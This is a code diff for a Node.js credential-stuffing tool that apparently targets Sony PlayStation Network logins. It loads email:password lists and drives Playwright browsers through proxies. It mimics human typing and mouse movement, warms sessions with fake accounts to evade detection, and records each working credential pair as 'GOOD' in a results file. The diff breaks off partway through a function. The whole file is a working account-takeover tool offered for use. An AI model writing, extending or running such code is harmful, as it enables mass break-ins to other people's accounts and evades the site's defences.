@@ -1,841 +1,573 @@
-import { io } from "socket.io-client";
-import { logger } from "./utils/logger.js";
-import { config } from "./utils/config.js";
-import {
-    ProfileManager,
-    AccountProcessor,
-    ProxyManager,
-    HumanBehavior
-} from "./modules/index.js";
-import {
-    initializeGlobalProfileManager,
-    startPeriodicCleanup,
-    showCurrentStats,
-    globalBrowserManager
-} from "./bot.js";
+import fs from "node:fs/promises";
+import fsSync from "node:fs";
+import axios from 'axios';
+import { logger } from "../utils/logger.js";
+import Constants from "./Constants.js";
+import HumanBehavior from "./HumanBehavior.js";
+import FakeAccountGenerator from "./FakeAccountGenerator.js";
+import PageHelpers from "./PageHelpers.js";
 
-// ==================== Main PSN Instance Class ====================
-class PSNInstance {
-    constructor() {
-        this.instanceId = config.INSTANCE_ID;
-        this.serverUrl = config.SERVER_WS_URL;
-        this.socket = null;
-        this.connected = false;
-        this.registered = false;
-        this.isProcessing = false;
-        this.workStartTime = null;
-        
-        this.stats = {
-            processed: 0,
-            success: 0,
-            errors: 0,
-            startTime: Date.now()
-        };
-
-        this.browserStats = {
-            profilesCreated: 0,
-            profilesClosed: 0,
-            browserErrors: 0
-        };
-
-        this.profileManager = new ProfileManager(null, globalBrowserManager);
-        this.accountProcessor = new AccountProcessor(null);
+// ==================== AccountProcessor Class ====================
+export default class AccountProcessor {
+    constructor(client) {
+        this.client = client;
+        this.maxRetries = Constants.MAX_RETRIES;
+        this.maxTimeoutRetries = Constants.MAX_TIMEOUT_RETRIES;
     }
 
-    // ==================== Socket Management ====================
-    initSocket() {
-        logger.info(`🔄 Connecting to server: ${this.serverUrl}`);
-
-        this.socket = io(this.serverUrl, {
-            path: '/instance-socket',
-            transports: ["websocket", "polling"],
-            reconnection: true,
-            reconnectionDelay: 5000,
-            reconnectionAttempts: Infinity,
-            timeout: 20000
-        });
-
-        this.setupSocketEvents();
-    }
-
-    setupSocketEvents() {
-        this.socket.on("connect", () => {
-            this.connected = true;
-            logger.info(`✅ Connected to server as ${this.instanceId}`);
-            this.registerInstance();
-        });
-
-        this.socket.on("disconnect", (reason) => {
-            this.connected = false;
-            this.registered = false;
-            this.isProcessing = false;
-            logger.warn(`❌ Disconnected: ${reason}`);
-        });
-
-        this.socket.on("registration-confirmed", (data) => {
-            this.registered = true;
-            logger.info(`🎯 Registration confirmed: ${data.instanceData.instanceId}`);
-            setTimeout(() => this.processWorkFlow(), 2000);
-        });
-
-        this.socket.on("registration-error", (data) => {
-            logger.error(`❌ Registration failed: ${data.error}`);
-            this.registered = false;
-        });
-
-        this._setupWorkflowEvents();
-        this._setupErrorEvents();
-    }
-
-    _setupWorkflowEvents() {
-        this.socket.on("proxy-assigned", (proxyData) => {
-            logger.debug(`📡 Proxy assigned event received`);
-        });
-
-        this.socket.on("no-proxy-available", (data) => {
-            logger.debug(`📡 No proxy available event received`);
-        });
-
-        this.socket.on("accounts-assigned", (accountsData) => {
-            logger.debug(`📡 Accounts assigned event received`);
-        });
-
-        this.socket.on("no-accounts-available", (data) => {
-            logger.debug(`📡 No accounts available event received`);
-        });
-
-        this.socket.on("results-acknowledged", (data) => {
-            logger.info(`✅ Results acknowledged: ${data.processed} accounts processed`);
-            setTimeout(() => {
-                if (this.connected && this.registered && !this.isProcessing) {
-                    this.processWorkFlow();
-                }
-            }, 3000);
-        });
-
-        this.socket.on("heartbeat-ack", (data) => {
-            // logger.debug(`💓 Heartbeat acknowledged`);
-        });
-    }
-
-    _setupErrorEvents() {
-        this.socket.on("error", (error) => {
-            logger.error(`❌ Socket error: ${error.message || error}`);
-        });
-
-        this.socket.on("connect_error", (error) => {
-            logger.error(`❌ Connection error: ${error.message || error}`);
-        });
-    }
-
-    // ==================== Registration ====================
-    registerInstance() {
-        const registrationData = {
-            instanceId: this.instanceId,
-            serverInfo: {
-                hostname: process.env.COMPUTERNAME || 'unknown',
-                platform: process.platform,
-                nodeVersion: process.version,
-                memory: process.memoryUsage(),
-                pid: process.pid,
-                clusterId: globalBrowserManager.clusterId
-            },
-            capabilities: {
-                batchSize: config.BATCH_SIZE || 3,
-                supportedSites: ['sony'],
-                maxConcurrency: config.MAX_CONCURRENCY || 3
+    // ==================== Static Methods for File Operations ====================
+    static async loadAccountBatch(batchSize = Constants.CONCURRENT_TABS) {
+        try {
+            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
+                console.log(`❌ Accounts file not found: ${Constants.ACCOUNTS_FILE}`);
+                return [];
             }
-        };
 
-        logger.info(`📝 Registering instance with capabilities: ${JSON.stringify(registrationData.capabilities)}`);
-        this.socket.emit("register-instance", registrationData);
+            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
+            const lines = content
+                .split("\n")
+                .map((l) => l.trim())
+                .filter(Boolean)
+                .filter(line => line.includes(':') && line.split(':').length >= 2);
+
+            console.log(`📊 Total accounts remaining in file: ${lines.length}`);
+
+            if (!lines.length) {
+                console.log("📄 No valid accounts found in file");
+                return [];
+            }
+
+            const batch = lines.slice(0, Math.min(batchSize, lines.length));
+            console.log(`📦 Selected batch of ${batch.length} accounts`);
+
+            if (batch.length > 0) {
+                const firstAccount = batch[0];
+                const maskedAccount = firstAccount.replace(/(.{3}).*@/, '$1***@').replace(/:(.{2}).*/, ':$1***');
+                console.log(`📋 First account in batch: ${maskedAccount}`);
+            }
+
+            return batch;
+
+        } catch (err) {
+            console.error("Error reading accounts file:", err.message);
+            return [];
+        }
     }
 
-    // ==================== Resource Requests ====================
-    async requestProxy() {
-        logger.info('🔍 Requesting proxy from server...');
-
-        return new Promise((resolve, reject) => {
-            const timeout = setTimeout(() => {
-                reject(new Error('Proxy request timeout after 15 seconds'));
-            }, 15000);
-
-            this.socket.emit("request-proxy");
-
-            const onProxyAssigned = (proxyData) => {
-                clearTimeout(timeout);
-                this.socket.off("proxy-assigned", onProxyAssigned);
-                this.socket.off("no-proxy-available", onNoProxy);
-                logger.info(`✅ Proxy received: ${proxyData.host}:${proxyData.port}`);
-                resolve(proxyData);
-            };
-
-            const onNoProxy = (data) => {
-                clearTimeout(timeout);
-                this.socket.off("proxy-assigned", onProxyAssigned);
-                this.socket.off("no-proxy-available", onNoProxy);
-                logger.warn(`⚠️ No proxy available: ${data.message}`);
-                reject(new Error(`No proxy available: ${data.message}`));
-            };
-
-            this.socket.on("proxy-assigned", onProxyAssigned);
-            this.socket.on("no-proxy-available", onNoProxy);
-        });
-    }
-
-    async requestAccounts(batchSize = 3) {
-        logger.info(`📋 Requesting ${batchSize} accounts from server...`);
-
-        return new Promise((resolve, reject) => {
-            const timeout = setTimeout(() => {
-                reject(new Error('Accounts request timeout after 15 seconds'));
-            }, 15000);
-
-            this.socket.emit("request-accounts", { batchSize });
-
-            const onAccountsAssigned = (accountsData) => {
-                clearTimeout(timeout);
-                this.socket.off("accounts-assigned", onAccountsAssigned);
-                this.socket.off("no-accounts-available", onNoAccounts);
-                logger.info(`✅ ${accountsData.accounts.length} accounts received`);
-                resolve(accountsData);
-            };
-
-            const onNoAccounts = (data) => {
-                clearTimeout(timeout);
-                this.socket.off("accounts-assigned", onAccountsAssigned);
-                this.socket.off("no-accounts-available", onNoAccounts);
-                logger.warn(`⚠️ No accounts available: ${data.message}`);
-                reject(new Error(`No accounts available: ${data.message}`));
-            };
-
-            this.socket.on("accounts-assigned", onAccountsAssigned);
-            this.socket.on("no-accounts-available", onNoAccounts);
-        });
-    }
-
-    // ==================== Main Workflow ====================
-    async processWorkFlow() {
-        if (this.isProcessing) {
-            logger.info('⏸ Already processing, skipping workflow...');
+    static async removeProcessedAccounts(processedCount) {
+        if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
             return;
         }
 
-        if (!this.connected || !this.registered) {
-            logger.warn('⚠️ Not connected or registered, skipping workflow...');
-            return;
+        const lines = (await fs.readFile(Constants.ACCOUNTS_FILE, "utf8"))
+            .split("\n")
+            .map((l) => l.trim())
+            .filter(Boolean);
+
+        const remaining = lines.slice(processedCount);
+
+        if (remaining.length > 0) {
+            await fs.writeFile(Constants.ACCOUNTS_FILE, remaining.join("\n") + "\n", "utf8");
+        } else {
+            await fs.writeFile(Constants.ACCOUNTS_FILE, "", "utf8");
         }
+    }
 
-        this.isProcessing = true;
-        this.workStartTime = Date.now();
-        let profileData = null;
-        let proxy = null;
-        let accounts = [];
-        let accountsData = null;
-
+    static async sendResultsToServer(results) {
         try {
-            logger.info('🚀 Starting new workflow...');
-            await this._executeWorkflowSteps(proxy, profileData, accounts, accountsData);
-            
-        } catch (error) {
-            logger.error(`❌ Workflow error: ${error.message}`);
-            await this._handleWorkflowError(error, profileData, proxy, accounts);
-            
-        } finally {
-            this.isProcessing = false;
-            await this._finalizeWorkflow();
+            const resultsText = results.map(result => {
+                const status = result.status === 'good' ? 'GOOD' : 'BAD';
+                return `${result.email}:${result.password} - ${status}`;
+            }).join('\n');
+
+            await fs.appendFile(Constants.RESULTS_FILE, resultsText + '\n', 'utf8');
+            console.log(`📊 Results saved to ${Constants.RESULTS_FILE}`);
+
+        } catch (err) {
+            console.error("Error sending results to server:", err.message);
         }
     }
 
-    async _executeWorkflowSteps(proxy, profileData, accounts, accountsData) {
-        // Step 1: Get Browser Stats
-        const browserStats = await globalBrowserManager.getClusterStats();
-        logger.info(`📊 Current browser stats: ${browserStats.totalBrowsers}/${browserStats.maxBrowsers} (Cluster ${globalBrowserManager.clusterId})`);
+    // ==================== Error Detection Methods ====================
+    static isCriticalError(error) {
+        const criticalPatterns = [
+            'PROXY_CONNECTION_FAILED',
+            'CONTEXT_DESTROYED',
+            'net::ERR_EMPTY_RESPONSE',
+            'net::ERR_CONNECTION_REFUSED',
+            'net::ERR_PROXY_CONNECTION_FAILED',
+            'net::ERR_TUNNEL_CONNECTION_FAILED'
+        ];
 
-        this.sendHeartbeat('starting', {
-            message: 'Starting new workflow',
-            startedAt: this.workStartTime,
-            browserStats: browserStats
-        });
-
-        // Step 2: Request Proxy
-        proxy = await this._requestProxyStep();
-        if (!proxy) return;
-
-        // Step 3: Create Profile
-        profileData = await this._createProfileStep(proxy);
-        if (!profileData) return;
-
-        // Step 4: Warmup (optional)
-        await this._warmupStep(profileData);
-
-        // Step 5: Request Accounts
-        accountsData = await this._requestAccountsStep();
-        if (!accountsData) return;
-        accounts = accountsData.accounts;
-
-        // Step 6: Process Accounts
-        const results = await this._processAccountsStep(profileData.context, accounts, accountsData);
-
-        // Step 7: Submit Results
-        await this._submitResultsStep(results?.finalResults, proxy, accountsData.batchId);
-
-        // Step 8: Cleanup
-        await this._cleanupStep(profileData);
-
-        logger.info('🎉 Workflow completed successfully!');
+        return criticalPatterns.some(pattern => 
+            error.message && error.message.includes(pattern)
+        );
     }
 
-    async _requestProxyStep() {
-        logger.info('🔍 Step 1: Requesting proxy...');
-        try {
-            const proxy = await this.requestProxy();
-            logger.info(`✅ Step 1 completed: Proxy ${proxy.host}:${proxy.port} received`);
-            return proxy;
-        } catch (proxyError) {
-            logger.error(`❌ Step 1 failed: ${proxyError.message}`);
-            setTimeout(() => {
-                if (this.connected && this.registered) {
-                    this.processWorkFlow();
-                }
-            }, 15000);
-            return null;
-        }
+    static isProxyError(errorMessage) {
+        const proxyErrorPatterns = [
+            'net::ERR_PROXY_CONNECTION_FAILED',
+            'net::ERR_TUNNEL_CONNECTION_FAILED',
+            'PROXY_CONNECTION_FAILED',
+            'Failed to determine external IP address',
+            'HTTP 503'
+        ];
+
+        return proxyErrorPatterns.some(pattern => 
+            errorMessage && errorMessage.includes(pattern)
+        );
     }
 
-    async _createProfileStep(proxy) {
-        logger.info('🔧 Step 2: Creating profile with proxy...');
-        try {
-            const profileData = await this.profileManager.createProfile(proxy, []);
-            
-            this.browserStats.profilesCreated++;
-            
-            logger.info('✅ Step 2 completed: Profile created successfully');
-            logger.info(`📊 Profile created by cluster ${globalBrowserManager.clusterId}: ${profileData.profile.name}`);
+    // ==================== Fake Account Processing ====================
+    async processFakeAccount(context) {
+        console.log("🎭 Processing fake account first to warm up the profile...");
 
-            const updatedStats = await globalBrowserManager.getClusterStats();
-            logger.info(`📈 Updated browser stats: ${updatedStats.totalBrowsers}/${updatedStats.maxBrowsers}`);
+        const fakeAccountLine = FakeAccountGenerator.generateFakeAccountLine();
+        console.log(`🎭 Using faker-generated fake account: ${fakeAccountLine}`);
 
-            this.sendHeartbeat('profile-created', {
-                proxyHost: proxy.host,
-                proxyPort: proxy.port,
-                profileId: profileData.profile.id,
-                clusterId: globalBrowserManager.clusterId,
-                browserStats: updatedStats
-            });
+        let page = null;
+        let retryCount = 0;
 
-            return profileData;
-
-        } catch (profileError) {
-            logger.error(`❌ Step 2 failed: ${profileError.message}`);
-            this.browserStats.browserErrors++;
-
-            if (this._isBrowserLimitError(profileError)) {
-                logger.warn('🚫 Browser limit exceeded, waiting longer before retry...');
-                this._releaseProxy(proxy, profileError.message);
-                setTimeout(() => {
-                    if (this.connected && this.registered) {
-                        this.processWorkFlow();
-                    }
-                }, 30000);
-                return null;
-            }
-
-            this._releaseProxy(proxy, profileError.message);
-            throw profileError;
-        }
-    }
-
-    async _warmupStep(profileData) {
-        logger.info('🎭 Step 3: Testing fake account for warmup...');
-        try {
-            // await this.accountProcessor.processFakeAccount(profileData.context);
-            logger.info('✅ Step 3 completed: Fake account test successful');
-
-            this.sendHeartbeat('warmup-completed', {
-                message: 'Fake account warmup completed'
-            });
-
-        } catch (fakeError) {
-            logger.error(`❌ Step 3 failed: ${fakeError.message}`);
-
-            if (AccountProcessor.isCriticalError(fakeError)) {
-                logger.warn('🚫 Proxy seems problematic, releasing it...');
-                throw fakeError;
-            }
-
-            logger.warn('⚠️ Fake account failed but continuing with real accounts...');
-        }
-    }
-
-    async _requestAccountsStep() {
-        logger.info('📋 Step 4: Requesting real accounts...');
-        try {
-            const accountsData = await this.requestAccounts(3);
-            logger.info(`✅ Step 4 completed: ${accountsData.accounts.length} accounts received`);
-
-            this.sendHeartbeat('accounts-received', {
-                accountCount: accountsData.accounts.length,
-                batchId: accountsData.batchId
-            });
-
-            return accountsData;
-
-        } catch (accountsError) {
-            logger.error(`❌ Step 4 failed: ${accountsError.message}`);
-            setTimeout(() => {
-                if (this.connected && this.registered) {
-                    this.processWorkFlow();
-                }
-            }, 15000);
-            return null;
-        }
-    }
-
-    async _processAccountsStep(context, accounts, accountsData) {
-        logger.info('🚀 Step 5: Processing real accounts in parallel...');
-        
-        this.sendHeartbeat('processing', {
-            accountCount: accounts.length,
-            batchId: accountsData.batchId,
-            startedAt: Date.now()
-        });
-
-        const results = await this.processAccountsInParallel(context, accounts);
-        logger.info(`✅ Step 5 completed: ${results.length} results generated`);
-
-        // Update local stats
-        results?.finalResults?.forEach(result => {
-            this.stats.processed++;
-            if (result.status === 'good') {
-                this.stats.success++;
-            } else {
-                this.stats.errors++;
-            }
-        });
-
-        return results;
-    }
-
-    async _submitResultsStep(results, proxy, batchId) {
-        logger.info('📊 Step 6: Submitting results to server...');
-        await this.submitResults(results, proxy, batchId);
-        logger.info('✅ Step 6 completed: Results submitted successfully');
-    }
-
-    async _cleanupStep(profileData) {
-        logger.info('🧹 Step 7: Cleaning up resources...');
-        await this.closeProfileSafely(profileData);
-        logger.info('✅ Step 7 completed: Cleanup successful');
-    }
-
-    // ==================== Account Processing ====================
-    async processAccountsInParallel(context, accounts) {
-        logger.info(`🚀 Starting parallel processing of ${accounts.length} accounts...`);
-
-        const abortController = new AbortController();
-        let shouldExitGlobal = false;
-        const completedResults = [];
-
-        const accountPromises = accounts.map(async (account, index) => {
-            const startDelay = index * HumanBehavior.randomDelay(2000, 4000);
-
-            if (startDelay > 0) {
-                logger.info(`⏳ Account ${account.email} waiting ${startDelay}ms before start...`);
-                await HumanBehavior.sleep(startDelay);
-            }
-
-            if (abortController.signal.aborted) {
-                logger.info(`⏹️ Account ${account.email} aborted before processing`);
-                return { type: 'aborted', account, index };
-            }
-
-            logger.info(`🚀 Starting account ${index + 1}: ${account.email}`);
-
+        while (retryCount < this.maxRetries) {
             try {
-                const accountString = `${account.email}:${account.password}`;
-                const result = await this.accountProcessor.processAccount(
-                    context,
-                    accountString,
-                    index,
-                    accounts.length
+                page = await context.newPage();
+                console.log(`🎭 Attempt ${retryCount + 1}/${this.maxRetries}: Loading page...`);
+
+                await this._loadPageWithRetry(page, retryCount);
+                break; // Success, exit retry loop
+
+            } catch (gotoErr) {
+                retryCount++;
+                console.log(`🎭 Attempt ${retryCount}/${this.maxRetries} failed:`, gotoErr.message);
+
+                if (page) {
+                    try { await page.close(); } catch { }
+                    page = null;
+                }
+
+                if (this._isCriticalConnectionError(gotoErr)) {
+                    console.log("❌ Critical connection error detected");
+                    throw new Error('PROXY_CONNECTION_FAILED');
+                }
+
+                if (retryCount < this.maxRetries) {
+                    const waitTime = Constants.RETRY_BASE_DELAY * retryCount;
+                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
+                    await HumanBehavior.sleep(waitTime);
+                } else {
+                    throw gotoErr;
+                }
+            }
+        }
+
+        await PageHelpers.waitFullLoadAndSettle(page);
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(1000, 2000));
+        await HumanBehavior.randomMouseMovements(page);
+
+        const submitSelector = "button[type=submit]";
+
+        // Email step with copy-paste
+        console.log("🎭 Processing fake email with copy-paste method...");
+        const emailFrame = await this._waitForEmailFrame(page);
+        const emailInput = PageHelpers.emailLocator(emailFrame);
+        const cutPassword = await this._humanPasteEmail(page, emailInput, fakeAccountLine);
+
+        await PageHelpers.safeClickMayNavigate(page, emailFrame, submitSelector);
+
+        // Password step with paste
+        console.log("🎭 Pasting fake password...");
+        const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 7500);
+        const passInput = PageHelpers.passwordLocator(passFrame);
+
+        await this._humanPastePassword(page, passInput, cutPassword);
+        await PageHelpers.safeClickMayNavigate(page, passFrame, submitSelector);
+
+        // Wait and check results
+        await HumanBehavior.sleep(HumanBehavior.randomDelay(2000, 3000));
+        const bodyText = await page.evaluate(() => document.body?.innerText || "");
+
+        if (bodyText.includes(`Can't connect to the server`)) {
+            throw new Error('SERVER_CONNECTION_FAILED');
+        }
+
+        console.log("🎭 Fake account process completed (expected to fail)");
+
+        // Save used fake account
+        const fakeAccountLogLine = `${fakeAccountLine}\n`;
+        await fs.appendFile('./fake_accounts_used.txt', fakeAccountLogLine, "utf8");
+
+        try {
+            if (page) await page.close();
+        } catch { }
+
+        console.log("🎭 Fake account warming completed. Now starting real accounts...");
+    }
+
+    async _loadPageWithRetry(page, retryCount) {
+        try {
+            await page.goto(Constants.LOGIN_URL, {
+                waitUntil: "networkidle",
+                timeout: 30000
+            });
+            console.log("✅ Page loaded with networkidle");
+        } catch (networkIdleErr) {
+            console.log("⚠️ NetworkIdle failed, trying with domcontentloaded...");
+            try {
+                await page.goto(Constants.LOGIN_URL, {
+                    waitUntil: "domcontentloaded",
+                    timeout: 20000
+                });
+                console.log("✅ Page loaded with domcontentloaded");
+            } catch (domErr) {
+                console.log("⚠️ DOMContentLoaded failed, trying basic load...");
+                await page.goto(Constants.LOGIN_URL, {
+                    waitUntil: "load",
+                    timeout: 25000
+                });
+                console.log("✅ Page loaded with basic load");
+            }
+        }
+    }
+
+    _isCriticalConnectionError(error) {
+        const criticalErrors = [
+            'net::ERR_EMPTY_RESPONSE',
+            'net::ERR_CONNECTION_REFUSED',
+            'net::ERR_PROXY_CONNECTION_FAILED',
+            'net::ERR_TUNNEL_CONNECTION_FAILED'
+        ];
+
+        return criticalErrors.some(pattern => 
+            error.message && error.message.includes(pattern)
+        );
+    }
+
+    async _waitForEmailFrame(page) {
+        try {
+            return await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 15000);
+        } catch (frameErr) {
+            console.log("🎭 Email frame not found:", frameErr.message);
+
+            if (frameErr.message.includes('Execution context was destroyed') ||
+                frameErr.message.includes('Frame with selector') ||
+                frameErr.message.includes('navigation')) {
+                throw new Error('CONTEXT_DESTROYED');
+            }
+
+            throw frameErr;
+        }
+    }
+
+    // ==================== Real Account Processing ====================
+    async processAccount(context, accountLine, tabIndex, accountsCount, abortSignal = null) {
+        let page = null;
+        let timeoutRetryCount = 0;
+        const startTime = Date.now();
+
+        try {
+            logger.info(`🚀 Tab ${tabIndex + 1}: Starting login for ${accountLine}`);
+            const email = accountLine.split(':')[0];
+
+            let finalResult = null;
+
+            while (timeoutRetryCount <= this.maxTimeoutRetries && !finalResult) {
+                try {
+                    if (abortSignal?.aborted) {
+                        throw new Error('Operation aborted');
+                    }
+
+                    await HumanBehavior.sleep(HumanBehavior.randomDelay(50, 250));
+                    page = await context.newPage();
+
+                    // Set unique viewport for each tab
+                    await page.setViewportSize({
+                        width: 1200 + (tabIndex * 50),
+                        height: 800 + (tabIndex * 30)
+                    });
+
+                    logger.info(`📄 Tab ${tabIndex + 1}: Loading page (attempt ${timeoutRetryCount + 1}/${this.maxTimeoutRetries + 1})...`);
+
+                    const loadSuccess = await this._loadLoginPage(page, tabIndex);
+                    if (!loadSuccess) {
+                        throw new Error('Page load failed after multiple attempts');
+                    }
+
+                    await PageHelpers.waitFullLoadAndSettle(page);
+
+                    const result = await this._performLogin(page, accountLine, tabIndex, startTime);
+                    finalResult = result;
+
+                } catch (retryErr) {
+                    logger.error(`❌ Tab ${tabIndex + 1}: Error during retry ${timeoutRetryCount} for ${email}: ${retryErr.message}`);
+
+                    if (timeoutRetryCount >= this.maxTimeoutRetries) {
+                        finalResult = {
+                            email,
+                            status: 'error',
+                            error: retryErr.message,
+                            responseTime: Date.now() - startTime,
+                            tabIndex,
+                            retryCount: timeoutRetryCount
+                        };
+                        break;
+                    } else {
+                        timeoutRetryCount++;
+                        await HumanBehavior.sleep(2000 + HumanBehavior.randomDelay(1000, 2000));
+                    }
+                }
+            }
+
+            return finalResult;
+
+        } catch (err) {
+            logger.error(`❌ Tab ${tabIndex + 1}: Error processing ${accountLine}: ${err.message}`);
+
+            return {
+                email: accountLine.split(':')[0],
+                status: 'server-error',
+                error: err.message,
+                responseTime: Date.now() - startTime,
+                tabIndex
+            };
+        } finally {
+            try {
+                if (page) {
+                    logger.info(`🧹 Tab ${tabIndex + 1}: Closing page...`);
+                    await page.close();
+                }
+            } catch (closeErr) {
+                logger.error(`Tab ${tabIndex + 1}: Page close error: ${closeErr.message}`);
+            }
+        }
+    }
+
+    async _loadLoginPage(page, tabIndex) {
+        const maxAttempts = 3;
+        
+        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+            try {
+                logger.info(`📄 Tab ${tabIndex + 1}: Load attempt ${attempt}/${maxAttempts}`);
+
+                await page.goto(Constants.LOGIN_URL, {
+                    waitUntil: "domcontentloaded",
+                    timeout: 25000
+                });
+
+                const success = await PageHelpers.waitForPageContent(
+                    page,
+                    "Sign in",
+                    20000,
+                    `${tabIndex + 1}`
                 );
 
-                const accountResult = {
-                    id: account.id,
-                    email: account.email,
-                    password: account.password,
-                    status: result.status,
-                    error: result.error || result.message || null,
-                    responseTime: result.responseTime || 0,
-                    screenshot: result.screenshot || null,
-                    additionalInfo: result.additionalInfo || {},
-                    tabIndex: index,
-                    shouldExit: result.shouldExit || false
-                };
-
-                return {
-                    type: result.shouldExit ? 'exit' : 'completed',
-                    result: accountResult,
-                    account,
-                    index
-                };
-
-            } catch (accountError) {
-                if (accountError.name === 'AbortError') {
-                    logger.info(`⏹️ Account ${account.email} was aborted`);
-                    return { type: 'aborted', account, index };
+                if (success) {
+                    logger.info(`✅ Tab ${tabIndex + 1}: Page loaded successfully on attempt ${attempt}`);
+                    return true;
                 }
 
-                logger.error(`❌ Error processing account ${account.email}: ${accountError.message}`);
-                return {
-                    type: 'error',
-                    result: {
-                        id: account.id,
-                        email: account.email,
-                        password: account.password,
-                        status: 'server-error',
-                        error: accountError.message,
-                        responseTime: 0,
-                        tabIndex: index
-                    },
-                    account,
-                    index
-                };
-            }
-        });
+                if (attempt < maxAttempts) {
+                    logger.warn(`⚠️ Tab ${tabIndex + 1}: Attempt ${attempt} failed, retrying...`);
+                    await HumanBehavior.sleep(2000 * attempt);
+                }
 
-        // Process results as they complete
-        const activePromises = [...accountPromises];
-        while (activePromises.length > 0 && !shouldExitGlobal) {
-            try {
-                const result = await Promise.race(activePromises);
-                const promiseIndex = activePromises.findIndex(p => p === accountPromises[result.index]);
+            } catch (loadErr) {
+                logger.error(`❌ Tab ${tabIndex + 1}: Load attempt ${attempt} error: ${loadErr.message}`);
                 
-                if (promiseIndex > -1) {
-                    activePromises.splice(promiseIndex, 1);
+                if (attempt < maxAttempts) {
+                    await HumanBehavior.sleep(3000 * attempt);
                 }
-
-                if (result.type === 'exit') {
-                    logger.warn(`🚨 Exit signal received from account ${result.result.email}. Aborting all processes...`);
-                    shouldExitGlobal = true;
-                    abortController.abort();
-                    completedResults.push(result.result);
-                    break;
-                } else if (result.type === 'completed') {
-                    logger.info(`✅ Account ${result.index + 1} completed: ${result.result.email} → ${result.result.status}`);
-                    completedResults.push(result.result);
-                } else if (result.type === 'error') {
-                    logger.error(`❌ Account ${result.index + 1} error: ${result.result.email}`);
-                    completedResults.push(result.result);
-                }
-
-            } catch (error) {
-                logger.error(`❌ Unexpected error in promise race: ${error.message}`);
-                break;
             }
         }
 
-        // Handle remaining promises
-        if (shouldExitGlobal) {
-            logger.warn(`🚨 Processing stopped due to exit condition. Processed ${completedResults.length} accounts.`);
-            await HumanBehavior.sleep(1000);
-        } else {
-            logger.info(`⏳ Waiting for remaining ${activePromises.length} accounts...`);
-            const remainingResults = await Promise.allSettled(activePromises);
-
-            remainingResults.forEach((result) => {
-                if (result.status === 'fulfilled' && result.value.type === 'completed') {
-                    completedResults.push(result.value.result);
-                }
-            });
-        }
-
-        const successCount = completedResults.filter(r => !['error', 'server-error', 'timeout-error'].includes(r.status)).length;
-        const errorCount = completedResults.length - successCount;
-
-        logger.info(`📈 Final summary: ${successCount} success, ${errorCount} errors, Total: ${completedResults.length}`);
-
-        return {
-            finalResults: completedResults,
-            exitTriggered: shouldExitGlobal,
-            totalProcessed: completedResults.length,
-            successCount,
-            errorCount
-        };
+        logger.error(`❌ Tab ${tabIndex + 1}: All load attempts failed`);
+        return false;
     }
 
-    // ==================== Profile Management ====================
-    async closeProfileSafely(profileData) {
+    async _performLogin(page, accountLine, tabIndex, startTime) {
+        const [email, password] = accountLine.split(':');
+        
         try {
-            if (profileData && profileData.context) {
-                await profileData.context.close();
-            }
+            // Email step
+            logger.info(`📧 Tab ${tabIndex + 1}: Processing email step...`);
+            const emailFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 15000);
+            const emailInput = PageHelpers.emailLocator(emailFrame);
+            
+            await this._humanPasteEmail(page, emailInput, accountLine);
+            await PageHelpers.safeClickMayNavigate(page, emailFrame, "button[type=submit]");
 
-            if (profileData && profileData.profile) {
-                await this.profileManager.closeProfile(profileData);
-            }
+            // Password step
+            logger.info(`🔑 Tab ${tabIndex + 1}: Processing password step...`);
+            const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 10000);
+            const passInput = PageHelpers.passwordLocator(passFrame);
+            
+            await this._humanPastePassword(page, passInput, password);
+            await PageHelpers.safeClickMayNavigate(page, passFrame, "button[type=submit]");
 
-            this.browserStats.profilesClosed++;
+            // Wait for result
+            await HumanBehavior.sleep(HumanBehavior.randomDelay(3000, 5000));
+            
+            return await this._analyzeLoginResult(page, email, password, tabIndex, startTime);
 
-            const updatedStats = await globalBrowserManager.getClusterStats();
-            logger.info(`📉 Profile closed. Global browsers: ${updatedStats.totalBrowsers}/${updatedStats.maxBrowsers}`);
-
-        } catch (cleanupError) {
-            logger.error(`❌ Profile cleanup error: ${cleanupError.message}`);
-            this.browserStats.browserErrors++;
-
-            if (profileData && profileData.globalManager) {
-                await profileData.globalManager.decrementBrowserCount();
-            }
+        } catch (loginErr) {
+            logger.error(`❌ Tab ${tabIndex + 1}: Login process error: ${loginErr.message}`);
+            
+            return {
+                email,
+                status: 'error',
+                error: loginErr.message,
+                responseTime: Date.now() - startTime,
+                tabIndex
+            };
         }
     }
 
-    // ==================== Results Management ====================
-    async submitResults(results, proxy, batchId) {
-        const processingTime = Date.now() - this.workStartTime;
+    async _analyzeLoginResult(page, email, password, tabIndex, startTime) {
+        try {
+            const bodyText = await page.evaluate(() => document.body?.innerText || "");
+            const currentUrl = page.url();
+            const responseTime = Date.now() - startTime;
 
-        const submissionData = {
-            results: results,
-            proxyResult: {
-                proxyId: proxy.id,
-                success: true,
-                responseTime: processingTime,
-                error: null
-            },
-            batchInfo: {
-                batchId: batchId,
-                processingTime: processingTime,
-                startTime: this.workStartTime,
-                endTime: Date.now(),
-                instanceStats: this.getStats(),
-                browserStats: this.browserStats,
-                clusterId: globalBrowserManager.clusterId
+            logger.info(`🔍 Tab ${tabIndex + 1}: Analyzing result for ${email}`);
+
+            // Check for success indicators
+            if (this._isLoginSuccessful(bodyText, currentUrl)) {
+                logger.info(`✅ Tab ${tabIndex + 1}: SUCCESS - ${email}`);
+                return {
+                    email,
+                    password,
+                    status: 'good',
+                    responseTime,
+                    tabIndex,
+                    url: currentUrl
+                };
             }
-        };
 
-        logger.info(`📊 Submitting results: ${results.length} accounts processed in ${processingTime}ms`);
+            // Check for server errors
+            if (this._isServerError(bodyText)) {
+                logger.error(`🚨 Tab ${tabIndex + 1}: SERVER ERROR - ${email}`);
+                return {
+                    email,
+                    password,
+                    status: 'server-error',
+                    error: 'Server connection failed',
+                    responseTime,
+                    tabIndex,
+                    shouldExit: true
+                };
+            }
 
-        return new Promise((resolve, reject) => {
-            const timeout = setTimeout(() => {
-                reject(new Error('Results submission timeout'));
-            }, 15000);
-
-            const onAcknowledged = (data) => {
-                clearTimeout(timeout);
